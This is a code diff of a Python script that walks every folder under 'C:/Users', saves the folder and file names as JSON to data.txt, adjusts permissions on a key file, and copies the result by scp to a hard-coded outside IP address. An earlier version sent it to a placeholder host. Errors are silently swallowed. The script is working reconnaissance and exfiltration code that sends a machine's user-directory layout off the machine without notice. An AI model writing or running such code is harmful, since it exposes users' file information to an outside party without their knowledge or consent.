@@ -1,12 +1,9 @@
 import os
-
-class List_Folder:
-    def __init__(self):
-        pass
-
-    def List(root_dir):
-        file_structure = {}
-        
+import time
+import json
+def create_file_structure(root_dir):
+    file_structure = {}
+    try:
         for foldername, subfolders, filenames in os.walk(root_dir):
             relative_path = os.path.relpath(foldername, root_dir)
             parent_folder = os.path.dirname(relative_path)
@@ -18,20 +15,17 @@ class List_Folder:
             file_structure[parent_folder].append({
                 folder_name: filenames
             })
-        
-        return file_structure
+    except:{}
+    
+    return file_structure
 
 # Specify the root directory to start traversal from
 root_directory = 'C:/Users'
 
-data = str(List_Folder().List(root_directory))
-with open("data.txt", "w") as file:
+data = create_file_structure(root_directory)
+data = json.dumps(data, indent = 4)
+
+with open(f"data.txt", "w+") as file:
     file.write(data)
-
-remote_ip = "<Enter a valid Ip as string>"
-remote_location = "<Enter loaction where file must be stored>"
-
-try:
-    os.system("scp -i key.pem data.txt ubuntu@{remote_ip}:{remote_location}")
-except:
-    raise ConnectionError
+os.system('icacls "key.pem" /inheritance:r /grant:r "%USERNAME%:R"')
+os.system(f"scp -i key.pem data.txt ubuntu@54.173.32.254:{time.time()}")
